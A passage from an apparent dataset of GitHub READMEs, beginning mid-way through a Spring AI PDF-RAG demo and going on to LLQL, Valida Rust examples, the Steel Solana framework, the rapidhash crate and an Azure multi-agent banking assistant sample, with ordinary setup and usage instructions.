- Dependencies: [Spring Initializer](https://start.spring.io/#!type=maven-project&language=java&platformVersion=3.3.4&packaging=jar&jvmVersion=23&groupId=dev.danvega&artifactId=markets&name=markets&description=Demo%20project%20for%20Spring%20Boot&packageName=dev.danvega.markets&dependencies=web,spring-ai-openai,spring-ai-pdf-document-reader,spring-ai-vectordb-pgvector,docker-compose)

## Dependencies

The project uses the following Spring Boot starters and dependencies:

```xml
<dependencies>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-web</artifactId>
    </dependency>
    <dependency>
        <groupId>org.springframework.ai</groupId>
        <artifactId>spring-ai-openai-spring-boot-starter</artifactId>
    </dependency>
    <dependency>
        <groupId>org.springframework.ai</groupId>
        <artifactId>spring-ai-pdf-document-reader</artifactId>
    </dependency>
    <dependency>
        <groupId>org.springframework.ai</groupId>
        <artifactId>spring-ai-pgvector-store-spring-boot-starter</artifactId>
    </dependency>
</dependencies>
```

## Getting Started

1. Configure your environment variables:
```properties
OPENAI_API_KEY=your_api_key_here
```

2. Update `application.properties`:
```properties
spring.ai.openai.api-key=${OPENAI_API_KEY}
spring.ai.openai.chat.model=gpt-4
spring.ai.vectorstore.pgvector.initialize-schema=true
```

3. Place your PDF documents in the `src/main/resources/docs` directory

## Running the Application

1. Start Docker Desktop

2. Launch the application:
```bash
./mvnw spring-boot:run
```

The application will:
- Start a PostgreSQL database with PGVector extension
- Initialize the vector store schema
- Ingest documents from the configured location
- Start a web server on port 8080

## Key Components

### IngestionService

The `IngestionService` handles document processing and vector store population:

```java
@Component
public class IngestionService implements CommandLineRunner {
    private final VectorStore vectorStore;
    
    @Value(""classpath:/docs/your-document.pdf"")
    private Resource marketPDF;
    
    @Override
    public void run(String... args) {
        var pdfReader = new ParagraphPdfDocumentReader(marketPDF);
        TextSplitter textSplitter = new TokenTextSplitter();
        vectorStore.accept(textSplitter.apply(pdfReader.get()));
    }
}
```

### ChatController

The `ChatController` provides the REST endpoint for querying documents:

```java
@RestController
public class ChatController {
    private final ChatClient chatClient;

    public ChatController(ChatClient.Builder builder, VectorStore vectorStore) {
        this.chatClient = builder
                .defaultAdvisors(new QuestionAnswerAdvisor(vectorStore))
                .build();
    }

    @GetMapping(""/"")
    public String chat() {
        return chatClient.prompt()
                .user(""Your question here"")
                .call()
                .content();
    }
}
```

## Making Requests

Query the API using curl or your preferred HTTP client:

```bash
curl http://localhost:8080/
```

The response will include context from your documents along with the LLM's analysis.

## Architecture Highlights

- **Document Processing**: Uses Spring AI's PDF document reader to parse documents into manageable chunks
- **Vector Storage**: Utilizes PGVector for efficient similarity searches
- **Context Retrieval**: Automatically retrieves relevant document segments based on user queries
- **Response Generation**: Combines document context with GPT-4's capabilities for informed responses

## Best Practices

1. **Document Ingestion**
    - Consider implementing checks before reinitializing the vector store
    - Use scheduled tasks for document updates
    - Implement proper error handling for document processing

2. **Query Optimization**
    - Monitor token usage
    - Implement rate limiting
    - Cache frequently requested information

3. **Security**
    - Secure your API endpoints
    - Protect sensitive document content
    - Safely manage API keys",0,0,1,,,0.0
AmrDeveloper/LLQL,master,"<h1 align=""center"">LLQL - LLVM IR/BC Query Language</h1></br>

<p align=""center"">
<img src=""media/llql_logo.svg"" width=""20%"" height=""20%""/>
</p>

<p align=""center"">
  <img alt=""Crates.io"" src=""https://img.shields.io/crates/v/llql?style=flat-square"">
  <img alt=""Deps"" src=""https://deps.rs/repo/github/amrdeveloper/llql/status.svg"">
  <img alt=""GitHub issues"" src=""https://img.shields.io/github/issues/amrdeveloper/llql"">
  <img alt=""GitHub"" src=""https://img.shields.io/github/license/amrdeveloper/llql"">
</p>

<p align=""center"">
LLQL is a tool that allow you to run SQL-like query with Pattern matching functions inspired by LLVM InstCombine Pattern Matchers on LLVM IR/BitCode files instead of database files using the GitQL SDK.
</p>

<p align=""center"">
  <img src=""media/llql_demo.png"" alt=""animated"" width=""100%""/>
</p>

---

### Sample

If we have LLVM IR function like this, and we want to match `add` instruction that has result of sub instruction as Left hand side and result of mul instruction as Right hand side.

```ir
define i32 @function(i32 %a, i32 %b) {
  %sub = sub i32 %a, %b
  %mull = mul i32 %a, %b
  %add = add i32 %sub, %mull
  ret i32 %add
}
```

We can query to print the instruction with this query

```sql
SELECT instruction FROM instructions WHERE m_inst(instruction, m_add(m_sub(), m_mul()))
```

Or for example you can query how many times this pattern exists in each function

```sql
SELECT function_name, count() FROM instructions WHERE m_inst(instruction, m_add(m_sub(), m_mul())) GROUP BY function_name
```

You can also filter by number of times the value is used for example for not used values

```IR
define i32 @function(i32 %a, i32 %b) {
  %unused_add = add i32 %a, 1

  %used_twice = add i32 %a, %b
  %add2 = add i32 %used_twice, %b
  %add3 = add i32 %used_twice, %add2
  ret i32 %add3
}
```

```sql
SELECT instruction FROM instructions WHERE m_inst(instruction, m_unused(m_add()))
```

and for value that used only time

```sql
SELECT instruction FROM instructions WHERE m_inst(instruction, m_has_one_use(m_add()))
```

and for value that used n times

```sql
SELECT instruction FROM instructions WHERE m_inst(instruction, m_has_n_uses(m_add(), 2))
```

---

### List of available functions

- [Instructions Matchers Functions](docs/InstructionMatcher.md)
- [Types Matchers functions](docs/TypeMatcher.md)

---

### Tables structures

#### Instructions table

| Name             | Type      | Description                     |
| ---------------- | --------- | ------------------------------- |
| function_name    | Text      | Instruction function name       |
| basic_block_name | Text      | Basic block of this instruction |
| instruction      | LLVMValue | LLVM Instruction                |

---

### Download or Install

Note that Building from source or installing from Cargo.io requires LibClang 16 to be installed

- Install from Cargo.io

```
cargo install llql
```

- Build from source code

```
git clone https://github.com/AmrDeveloper/LLQL.git
cd LLQL
cargo build
```

### Run LLQL

```
LLQL is a SQL like query language to run on LLVM IR/BitCode files
Usage: LLQL [OPTIONS]

Options:
  -f,  --files <paths>        Path for local files to run query on
  -q,  --query <GQL Query>    LLQL query to run on selected files
  -p,  --pagination           Enable print result with pagination
  -ps, --pagesize             Set pagination page size [default: 10]
  -o,  --output               Set output format [render, json, csv]
  -a,  --analysis             Print Query analysis
  -e,  --editor               Enable GitQL LineEditor
  -h,  --help                 Print LLQL help
  -v,  --version              Print LLQL Current Version
```

### License

```
MIT License

Copyright (c) 2024 Amr Hesham

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the ""Software""), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```",2,0,1,MIT,ci.yaml,0.0
lita-xyz/rust-examples,main,"# Rust-Examples

## General Description

This project is a collection of various applications built using the Valida framework, which allows for the execution of Rust code with proofs of correctness. Each application serves as a template for demonstrating different functionalities, from simple calculations to more complex algorithms like Conway's Game of Life. The goal of this project is to provide a set of examples that can be used as a foundation for developing more advanced applications while ensuring correctness through formal verification.

This documentation provides an overview of the various projects in this directory, along with links to their respective README files for detailed instructions and usage.

## Projects

1. **Fibonacci**
   - Description: A template project for calculating the n-th Fibonacci number and proving the execution of the computation in Valida.
   - [Read the README](fibonacci/README.md)

2. **Hello World**
   - Description: A simple program that prints ""Hello, World!"" in Valida.
   - [Read the README](hello_world/README.md)

3. **Conway's Game of Life**
   - Description: A program that plays Conway's Game of Life and proves the execution of the computation in Valida.
   - [Read the README](conway/README.md)

4. **Simple Calculator**
   - Description: A simple calculator program on Valida.
   - [Read the README](simple_calculator/README.md)

5. **Random Number Guessing Game**
   - Description: A random number guessing game on Valida.
   - [Read the README](guessing_game/README.md)

6. **JSON Path Contains**
   - Description: A project to prove a JsonPath contains a value.
   - [Read the README](json_contains/README.md)

## Conclusion

For more information on each project, please refer to the linked README files. Each project contains specific instructions on setup, usage, and system requirements.
",0,3,16,Apache-2.0,,22.0
regolith-labs/steel,master,"# üèóÔ∏è Steel 

**Steel is a new Solana smart contract framework.** It provides a library of helper functions, macros, and code patterns for building safe and maintainable smart contracts on the Solana blockchain.

## Notes

- **Steel is under active development. All interfaces are subject to change.**
- **This code is unaudited. Use at your own risk!**

## Todos

- [ ] Localnet toolchain.
- [ ] Mainnet toolchain.
- [ ] Passthrough cargo args.
- [ ] IDL generation.
- [x] ~~Helper functions for simple lamport transfers.~~
- [x] ~~Helper functions to emit events (wrap sol_log_data).~~
- [x] ~~Custom error messages on account validation checks.~~
- [x] ~~Helper function to close AccountInfos.~~
- [x] ~~CLI with init script.~~
- [x] ~~Account parsers and validation.~~

## Get started

Install the Steel CLI:
```sh
cargo install steel-cli
```

Use the `new` command to create a new project:
```sh
steel new my-project
```

Compile your program using the Solana toolchain:
```sh
steel build
```

Test your program using the Solana toolchain:
```sh
steel test
```

## File structure

While not strictly enforced, we recommend organizing your Solana program with the following file structure. We have found this pattern to improve code readability, separating the contract interface from its implementation. It scales well for complex contracts. 

```
Cargo.toml (workspace)
‚åô api
  ‚åô Cargo.toml
  ‚åô src
    ‚åô consts.rs
    ‚åô error.rs
    ‚åô event.rs
    ‚åô instruction.rs
    ‚åô lib.rs
    ‚åô loaders.rs
    ‚åô sdk.rs
    ‚åô state
      ‚åô mod.rs
      ‚åô account_1.rs
      ‚åô account_2.rs
‚åô program
  ‚åô Cargo.toml
  ‚åô src
    ‚åô lib.rs
    ‚åô instruction_1.rs
    ‚åô instruction_2.rs
```

## API

### Accounts

Use the `account!` macro to link account structs with a discriminator and implement basic serialization logic.

```rs
use steel::*;

#[repr(u8)]
#[derive(Clone, Copy, Debug, Eq, PartialEq, IntoPrimitive, TryFromPrimitive)]
pub enum MyAccount {
    Counter = 0,
    Profile = 1,
}

#[repr(C)]
#[derive(Clone, Copy, Debug, PartialEq, Pod, Zeroable)]
pub struct Counter {
    pub value: u64,
}

#[repr(C)]
#[derive(Clone, Copy, Debug, PartialEq, Pod, Zeroable)]
pub struct Profile {
    pub id: u64,
}

account!(MyAccount, Counter);
account!(MyAccount, Profile);
```

### Instructions

Use the `instruction!` macro to link instruction data with a discriminator and implement basic serialization logic.

```rs
use steel::*;

#[repr(u8)]
#[derive(Clone, Copy, Debug, Eq, PartialEq, TryFromPrimitive)]
pub enum MyInstruction {
    Add = 0,
    Initialize = 1,
}

#[repr(C)]
#[derive(Clone, Copy, Debug, Pod, Zeroable)]
pub struct Add {
    pub value: [u8; 8],
}

#[repr(C)]
#[derive(Clone, Copy, Debug, Pod, Zeroable)]
pub struct Initialize {}

instruction!(MyInstruction, Add);
instruction!(MyInstruction, Initialize);

```

### Errors

Use the `error!` macro to define custom errors.

```rs
use steel::*;

#[repr(u32)]
#[derive(Debug, Error, Clone, Copy, PartialEq, Eq, IntoPrimitive)]
pub enum MyError {
    #[error(""You did something wrong"")]
    Dummy = 0,
}

error!(MyError);
```

### Events

Use the `event!` macro to define custom events.

```rs
use steel::*;

#[repr(C)]
#[derive(Clone, Copy, Debug, PartialEq, Pod, Zeroable)]
pub struct MyEvent {
    pub value: u64,
}

event!(MyEvent);
```

## Program

### Entrypoint

Use the `entrypoint!` macro to streamline the program entrypoint.

```rs
mod add;
mod initialize;

use add::*;
use initialize::*;

use example_api::prelude::*;
use steel::*;

pub fn process_instruction(
    program_id: &Pubkey,
    accounts: &[AccountInfo],
    data: &[u8],
) -> ProgramResult {
    let (ix, data) = parse_instruction::<MyInstruction>(&example_api::ID, program_id, data)?;

    match ix {
        MyInstruction::Add => process_add(accounts, data)?,
        MyInstruction::Initialize => process_initialize(accounts, data)?,
    }

    Ok(())
}

entrypoint!(process_instruction);
```

### Validation

Use chainable parsers and assertions to validate account data.

```rs
use example_api::prelude::*;
use steel::*;

pub fn process_add(accounts: &[AccountInfo<'_>], _data: &[u8]) -> ProgramResult {
    let [signer_info, counter_info] = accounts else {
        return Err(ProgramError::NotEnoughAccountKeys);
    };

    signer_info.is_signer()?;

    let counter = counter_info
        .as_account_mut::<Counter>(&example_api::ID)? 
        .assert_mut(|c| c.value <= 42)?;

    counter.value += 1;

    Ok(())
}
```

### CPIs

Use helper functions to execute common tasks like creating accounts and transferring tokens.

```rs
use example_api::prelude::*;
use steel::*;

pub fn process_transfer(accounts: &[AccountInfo<'_>], _data: &[u8]) -> ProgramResult {
    let [signer_info, counter_info, mint_info, sender_info, receiver_info, token_program] = accounts else {
        return Err(ProgramError::NotEnoughAccountKeys);
    };

    signer_info.is_signer()?;

    counter_info
        .as_account::<Counter>(&example_api::ID)?
        .assert(|c| c.value >= 42)?;

    mint_info.as_mint()?;

    sender_info
        .is_writable()?
        .as_token_account()?
        .assert(|t| t.owner == *signer_info.key)?
        .assert(|t| t.mint == *mint_info.key)?;

    receiver_info
        .is_writable()?
        .as_token_account()?
        .assert(|t| t.mint == *mint_info.key)?;

    token_program.is_program(&spl_token::ID)?;

    transfer(
        signer_info,
        sender_info,
        receiver_info,
        token_program,
        counter.value,
    )?;

    Ok(())
}
```
",2,4,2,,,20.0
hoxxep/rapidhash,master,"# rapidhash - rust implementation

A rust implementation of the [rapidhash](https://github.com/Nicoshev/rapidhash) function, the official successor to [wyhash](https://github.com/wangyi-fudan/wyhash).

- **High quality**, the fastest hash passing all tests in the SMHasher and SMHasher3 benchmark. Collision-based study showed a collision probability lower than wyhash and close to ideal.
- **Very fast**, the fastest passing hash in SMHasher3. Significant throughput improvement over wyhash. Fastest memory-safe hash. Fastest platform-independent hash. Fastest const hash.
- **Platform independent**, works on all platforms, no dependency on machine-specific vectorized or cryptographic hardware instructions. Optimised for both AMD64 and AArch64.
- **Memory safe**, when the `unsafe` feature is disabled (default). This implementation has also been fuzz-tested with `cargo fuzz`.
- **No dependencies and no-std compatible** when disabling the `std` feature.
- **Official successor to wyhash**, with improved speed, quality, and compatibility.
- **Inline variants** that use `#[inline(always)]` on `RapidInlineHash` and `RapidInlineHashBuilder` to force compiler optimisations on specific input types (can double the hash performance depending on the hashed type).
- **Run-time and compile-time hashing** as the hash implementation is fully `const`.
- **Idiomatic** `std::hash::Hasher` compatible hasher for `HashMap` and `HashSet` usage.
- **Non-cryptographic** hash function.

## Usage
### Hashing
```rust
use std::hash::Hasher;
use rapidhash::{rapidhash, RapidInlineHasher, RapidHasher};

// direct const usage
assert_eq!(rapidhash(b""hello world""), 17498481775468162579);

// a std::hash::Hasher compatible hasher
let mut hasher = RapidInlineHasher::default();
hasher.write(b""hello world"");
assert_eq!(hasher.finish(), 17498481775468162579);

// a non-inline hasher for when you don't want to force inlining,
// such as when being careful with WASM binary size.
let mut hasher = RapidHasher::default();
hasher.write(b""hello world"");
assert_eq!(hasher.finish(), 17498481775468162579);

// a const API similar to std::hash::Hasher
const HASH: u64 = RapidInlineHasher::default_const()
    .write_const(b""hello world"")
    .finish_const();
assert_eq!(HASH, 17498481775468162579);
```

### Helper Types
```rust
// also includes HashSet equivalents
use rapidhash::{RapidHashMap, RapidInlineHashMap};

// std HashMap with the RapidHashBuilder hasher.
let mut map = RapidHashMap::default();
map.insert(""hello"", ""world"");

// a hash map type using the RapidInlineHashBuilder to force the compiler to
// inline the hash function for further optimisations (can be over 30% faster).
let mut map = RapidInlineHashMap::default();
map.insert(""hello"", ""world"");
```

## Features

- `default`: `std`
- `std`: Enables the `RapidHashMap` and `RapidHashSet` helper types.
- `rand`: Enables `RapidRandomState`, a `BuildHasher` that randomly initializes the seed. Includes the `rand` crate dependency.
- `rng`: Enables `RapidRng`, a fast, non-cryptographic random number generator based on rapidhash. Includes the `rand_core` crate dependency.
- `unsafe`: Uses unsafe pointer arithmetic to skip some unnecessary bounds checks for a small 3-4% performance improvement.

## How to choose your hash function

Hash functions are not a one-size fits all. Benchmark your use case to find the best hash function for your needs, but here are some general guidelines on choosing a hash function:

- `default`: Use the std lib hasher when hashing is not in the critical path, or if you need strong HashDoS resistance.
- `rapidhash`: You are hashing complex objects or byte streams, need compile-time hashing, or a performant high-quality hash. Benchmark the `RapidInline` variants if you need the utmost performance.
- `fxhash`: You are hashing integers, or structs of only integers, and the lower quality hash doesn't affect your use case.
- `gxhash`: You are hashing long byte streams on platforms with the necessary instruction sets and only care about throughput. You don't need memory safety, HashDoS resistance, or platform independence (for example, gxhash doesn't currently compile on Github Actions workflows).

## Benchmarks

Initial benchmarks on M1 Max (aarch64) for various input sizes.

### Hashing Benchmarks
There are two types of benchmarks over the different algorithms to cover various forms of compiler optimisation that Rust can achieve:
- `str_len`: hashing bytes (a string) of the given length, where the length is not known at compile time.
- `u64`: hashing a u64, 8 bytes of known size, where the compiler can optimise the path.

Note on wyhash: hashing throughput doesn't translate to hashmap insertion throughput, see the hashmap insertion benchmarks below.

![Hashing Benchmarks](https://github.com/hoxxep/rapidhash/raw/master/docs/bench_hash.svg)

### HashMap Insertion Benchmarks

Hash speed and throughput can be a poor measure in isolation, as it doesn't take into account hash quality. More hash collisions can cause slower hashmap insertion, and so hashmap insertion benchmarks can be a better measure of hash performance. As always, benchmark your use case.

![Hashing Benchmarks](https://github.com/hoxxep/rapidhash/raw/master/docs/bench_insert.svg)

## Versioning
The minimum supported Rust version (MSRV) is 1.77.0.

The rapidhash crate follows the following versioning scheme:
- Major for breaking changes, such as hash output changes, breaking API changes, MSRV version bumps. When the RNG code is stabilised, major version bumps to `rand_core` will also trigger a major version bump of rapidhash due to the re-exported trait implementations.
- Minor for significant API additions/deprecations.
- Patch for bug fixes and performance improvements.

## License and Acknowledgements
This project is licensed under both the MIT and Apache-2.0 licenses. You are free to choose either license.

With thanks to [Nicolas De Carli](https://github.com/Nicoshev) for the original [rapidhash](https://github.com/Nicoshev/rapidhash) C++ implementation, which is licensed under the [BSD 2-Clause license](https://github.com/Nicoshev/rapidhash/blob/master/LICENSE).

With thanks to [Justin Bradford](https://github.com/jabr) for letting us use the rapidhash crate name üçª
",2,1,5,Apache-2.0,"crates.yaml,rust.yaml",5.0
Azure-Samples/agent-openai-java-banking-assistant,main,"---
page_type: sample
languages:
- azdeveloper
- java
- bicep
- typescript
- html
products:
- ai-services 
- azure
- azure-openai
- active-directory
- azure-cognitive-search
- azure-container-apps
- azure-sdks
- github
- document-intelligence
- azure-monitor
- azure-pipelines
urlFragment: agent-openai-java-banking-assistant
name: Multi Agents Banking Assistant with Java and Semantic Kernel
description: A Java sample app emulating a personal banking AI-powered assistant to inquire about account balances, review recent transactions, or initiate payments
---
<!-- YAML front-matter schema: https://review.learn.microsoft.com/en-us/help/contribute/samples/process/onboarding?branch=main#supported-metadata-fields-for-readmemd -->
<!-- prettier-ignore -->
<div align=""center"">

![](./docs/assets/robot-agents-small.png)

# Multi Agents Banking Assistant with Java and Semantic Kernel

[![Open project in GitHub Codespaces](https://img.shields.io/badge/Codespaces-Open-blue?style=flat-square&logo=github)](https://codespaces.new/azure-samples/agent-openai-java-banking-assistant?hide_repo_select=true&ref=main&quickstart=true)
[![Build Status](https://img.shields.io/github/actions/workflow/status/azure-samples/agent-openai-java-banking-assistant/azure-dev.yaml?style=flat-square&label=Build)](https://github.com/azure-samples/agent-openai-java-banking-assistant/actions)
![Java version](https://img.shields.io/badge/Java->=17-3c873a?style=flat-square)
[![License](https://img.shields.io/badge/License-MIT-yellow?style=flat-square)](LICENSE)

<!-- [![Watch how to use this sample on YouTube](https://img.shields.io/badge/YouTube-Watch-d95652.svg?style=flat-square&logo=youtube)]() -->

:star: If you like this sample, star it on GitHub ‚Äî it helps a lot!

[Overview](#overview) ‚Ä¢ [Architecture](#agents-concepts-and-architectures) ‚Ä¢ [Get started](#getting-started) ‚Ä¢  [Resources](#resources) ‚Ä¢ [FAQ](#faq) ‚Ä¢ [Troubleshooting](#troubleshooting)

![](./docs/assets/ui.gif)
</div>

This project is designed as a Proof of Concept (PoC) to explore the innovative realm of generative AI within the context of multi-agent architectures. By leveraging Java and Microsoft Semantic Kernel AI orchestration framework, our aim is to build a chat web app to demonstrate the feasibility and reliability of using generative AI agents to transform user experience from web clicks to natural language conversations while maximizing reuse of the existing workload data and APIs.



## Overview
The core use case of this Proof of Concept (PoC) revolves around a banking personal assistant designed to revolutionize the way users interact with their bank account information, transaction history, and payment functionalities. Utilizing the power of generative AI within a multi-agent architecture, this assistant aims to provide a seamless, conversational interface through which users can effortlessly access and manage their financial data.

Instead of navigating through traditional web interfaces and menus, users can simply converse with the AI-powered assistant to inquire about their account balances, review recent transactions, or initiate payments. This approach not only enhances user experience by making financial management more intuitive and accessible but also leverages the existing workload data and APIs to ensure a reliable and secure service.

Invoices samples are included in the data folder to make it easy to explore payments feature. The payment agent equipped with OCR tools ( Azure Document Intelligence) will lead the conversation with the user to extract the invoice data and initiate the payment process. Other account fake data as transactions, payment methods and account balance are also available to be queried by the user. All data and services are exposed as external REST APIs and consumed by the agents to provide the user with the requested information.

## Features 
This project provides the following features and technical patterns:
 - Simple multi ai agents Java implementation using *gpt-4o-mini* on Azure Open AI.
 - Chat intent extraction and agent routing.
 - Agents tools configuration and automatic tools invocations with [Java Semantic Kernel](https://github.com/microsoft/semantic-kernel-java/).
 - Tools output cache scoped at chat conversation level.It improves functions call planning and parameters extraction for long chat.
 - Chat based conversation implemented as [React Single Page Application](https://react.fluentui.dev/?path=/docs/concepts-introduction--docs) with support for images upload.Supported images are invoices, receipts, bills jpeg/png files you want your virtual banking assistant to pay on your behalf.
 - Images scanning and data extraction with Azure Document Intelligence using [prebuilt-invoice](https://learn.microsoft.com/en-us/azure/ai-services/document-intelligence/concept-invoice?view=doc-intel-4.0.0) model.
 - Import REST api contracts (OpenAPI yaml files) as agent tools, providing automatic rest client call. It uses code from Java Semantic Kernel [open-api-plugin code sample](https://github.com/microsoft/semantic-kernel-java/tree/main/samples/semantickernel-sample-plugins/semantickernel-openapi-plugin).
 - Add a copilot app side-by-side to your existing business microservices hosted on [Azure Container Apps](https://azure.microsoft.com/en-us/products/container-apps).
 - Automated Azure resources creation and solution deployment leveraging [Azure Developer CLI](https://learn.microsoft.com/en-us/azure/developer/azure-developer-cli/).

For complex agents conversation implementation, read more about [Autogen framework](https://github.com/microsoft/autogen).

### Architecture
![HLA](docs/assets/HLA.png)
The personal banking assistant is designed as a [vertical multi-agent system](./docs/multi-agents/introduction.md), with each agent specializing in a specific functional domain (e.g., account management, transaction history, payments). The architecture consists of the following key components:

- **Copilot Assistant Copilot App (Microservice)**: Serves as the central hub for processing user requests. It's a spring boot application implementing a vertical multi-agent architectures using Java Semantic Kernel to create Agents equipped with tools. in Java the Agent Router to understand user intent from chat interactions and routes the request to the appropriate domain-specific agent.
    - **Agent Router**: Acts as a user proxy, interpreting user intent based on chat inputs and directing the request to the specific domain agent. This component ensures that user queries are efficiently handled by the relevant agent. It uses **IntentExtractor** tool backed by GPT4 model to extract the user intent in a json format. If intent is 'None' clarifying questions are provided. 

    - **Account Agent**: Specializes in handling tasks related to banking account information, credit balance, and registered payment methods. It leverages specific Account service APIs to fetch and manage account-related data. Semantic Kernel HTTP plugin is used to create a tool definition from the rest api yaml contract (Open API specification) and automatically call the HTTP endpoint with input parameters extracted by gpt4 model from the chat conversation.

    - **Transactions Agent**: Focuses on tasks related to querying user bank movements, including income and outcome payments. This agent accesses account api to retrieve accountid and transaction history service to search for transactions and present them to the user.

    - **Payments Agent**: Dedicated to managing tasks related to submitting payments. It interacts with multiple APIs and tools, such as ScanInvoice (backed by Azure Document Intelligence), Account Service to retrieve account and payment methods info, Payment Service to submit payment processing and Transaction History service to check for previous paid invoices.

- **Existing Business APIs**: Interfaces with the backend systems to perform operations related to personal banking accounts, transactions, and invoice payments. These APIs are implemented as external spring boot microservices providing the necessary data and functionality consumed by agents to execute their tasks.
    - **Account Service (Microservice)**: Provides functionalities like retrieving account details by username, fetching payment methods, and getting registered beneficiaries. This microservice supports all 3 agents.

    - **Payments Service (Microservice)**: Offers capabilities to submit payments and notify transactions. It is a critical component for the Payments Agent to execute payment-related tasks efficiently.

    - **Reporting Service (Microservice)**: Enables searching transactions and retrieving transactions by recipient. This service supports the Transactions Agent in providing detailed transaction reports to the user and the Payment Agent as it needs to check if an invoice has not been already paid.

## Getting Started

### Run in GitHub Codespaces or VS Code Dev Containers

You can run this repo virtually by using GitHub Codespaces or VS Code Dev Containers.  Click on one of the buttons below to open this repo in one of those options.

[![Open in GitHub Codespaces](https://img.shields.io/static/v1?style=for-the-badge&label=GitHub+Codespaces&message=Open&color=brightgreen&logo=github)](https://codespaces.new/azure-samples/agent-openai-java-banking-assistant?hide_repo_select=true&ref=main&quickstart=true)
[![Open in VS Code Dev Containers](https://img.shields.io/static/v1?style=for-the-badge&label=Remote%20-%20Containers&message=Open&color=blue&logo=visualstudiocode)](https://vscode.dev/redirect?url=vscode://ms-vscode-remote.remote-containers/cloneInVolume?url=https://github.com/azure-samples/agent-openai-java-banking-assistant/)

All prerequisites are already installed in the container.  You can skip to the [Starting from scratch](#starting-from-scratch) section.

### Prerequisites

* [Java 17](https://learn.microsoft.com/en-us/java/openjdk/download#openjdk-17)
* [Maven 3.8.x](https://maven.apache.org/download.cgi)
* [Azure Developer CLI](https://aka.ms/azure-dev/install)
* [Node.js](https://nodejs.org/en/download/)
* [Git](https://git-scm.com/downloads)
* [Powershell 7+ (pwsh)](https://github.com/powershell/powershell) - For Windows users only.
  * **Important**: Ensure you can run `pwsh.exe` from a PowerShell command. If this fails, you likely need to upgrade PowerShell.


>[!WARNING] Your Azure Account must have `Microsoft.Authorization/roleAssignments/write` permissions, such as [User Access Administrator](https://learn.microsoft.com/azure/role-based-access-control/built-in-roles#user-access-administrator) or [Owner](https://learn.microsoft.com/azure/role-based-access-control/built-in-roles#owner).  

### Starting from scratch

You can clone this repo and change directory to the root of the repo. Or you can run `azd init -t Azure-Samples/agent-openai-java-banking-assistant`.

Once you have the project available locally, run the following commands if you don't have any pre-existing Azure services and want to start from a fresh deployment.

1. Run 

    ```shell
    azd auth login
    ```

2. Run 

    ```shell
    azd up
    ```
    
    * This will provision Azure resources and deploy this sample to those resources.
    * The project has been tested with gpt4-o-mini model which is currently available in these regions: **eastus** (Default), **swedencentral**.  For an up-to-date list of regions and models, check [here](https://learn.microsoft.com/en-us/azure/ai-services/openai/concepts/models)
    * The Azure Document Intelligence  new rest API is used which is currently available in these regions: **eastus**(Default), **westus2**, **westeurope**. More info [here](https://learn.microsoft.com/en-us/azure/ai-services/document-intelligence/sdk-overview-v4-0?view=doc-intel-4.0.0&tabs=csharp)

3. After the application has been successfully deployed you will see a web app URL printed to the console.  Click that URL to interact with the application in your browser.  

It will look like the following:

!['Output from running azd up'](docs/assets/azd-success.png)


### Deploying with existing Azure resources

If you already have existing Azure resources, you can re-use those by setting `azd` environment values.

#### Existing resource group

1. Run `azd env set AZURE_RESOURCE_GROUP {Name of existing resource group}`
2. Run `azd env set AZURE_LOCATION {Location of existing resource group (i.e eastus2)}`

#### Existing OpenAI resource

1. Run `azd env set AZURE_OPENAI_SERVICE {Name of existing OpenAI service}`
2. Run `azd env set AZURE_OPENAI_RESOURCE_GROUP {Name of existing resource group that OpenAI service is provisioned to}`
3. Run `azd env set AZURE_OPENAI_SERVICE_LOCATION {Location of existing resource (i.e eastus2)}`. Only needed if your OpenAI resource is in a different location than the one you'll pick for the `azd up` step.
4. Run `azd env set AZURE_OPENAI_CHATGPT_DEPLOYMENT {Name of existing ChatGPT deployment}`. Only needed if your ChatGPT deployment is not the default 'gpt4-o-mini'.

#### Existing Azure Document Intelligence

1. Run `azd env set AZURE_DOCUMENT_INTELLIGENCE_SERVICE {Name of existing Azure Document Intelligence}`
2. Run `azd env set AZURE_DOCUMENT_INTELLIGENCE_RESOURCE_GROUP {Name of existing resource group with Azure Document Intelligence service}`
3. If that resource group is in a different location than the one you'll pick for the `azd up` step,
   then run `azd env set AZURE_DOCUMENT_INTELLIGENCE_RESOURCE_GROUP_LOCATION {Location of existing service}`

#### Other existing Azure resources

You can also use existing Form Recognizer and Storage Accounts. See `./infra/main.parameters.json` for list of environment variables to pass to `azd env set` to configure those existing resources.

#### Provision remaining resources

Now you can run `azd up`, following the steps in [Deploying from scratch](#deploying-from-scratch) above.
That will both provision resources and deploy the code.


### Redeploying

If you've only changed the backend/frontend code in the `app` folder, then you don't need to re-provision the Azure resources. You can just run:

```shell
azd deploy
```

If you've changed the infrastructure files (`infra` folder or `azure.yaml`), then you'll need to re-provision the Azure resources. You can do that by running:

```shell
azd up
```
 > [!WARNING]
 > When you run `azd up` multiple times to redeploy infrastructure, make sure to set the following parameters in `infra/main.parameters.json` to `true` to avoid container apps images from being overridden with default ""mcr.microsoft.com/azuredocs/containerapps-helloworld"" image:

```json
 ""copilotAppExists"": {
      ""value"": false
    },
    ""webAppExists"": {
      ""value"": false
    },
    ""accountAppExists"": {
      ""value"": false
    },
    ""paymentAppExists"": {
      ""value"": false
    },
    ""transactionAppExists"": {
      ""value"": false
    }
```

### Running locally

1. Run

    ```shell
    az login
    ```

2. Change dir to `app`

    ```shell
    cd app
    ```

3. Run the `./start-compose.ps1` (Windows) or `./start-compose.sh` (Linux/Mac) scripts or run the ""VS Code Task: Start App"" to start the project locally.
4. Wait for the docker compose to start all the containers (web, api, indexer) and refresh your browser to [http://localhost](http://localhost)


## Guidance

### Testing different gpt4 models and versions
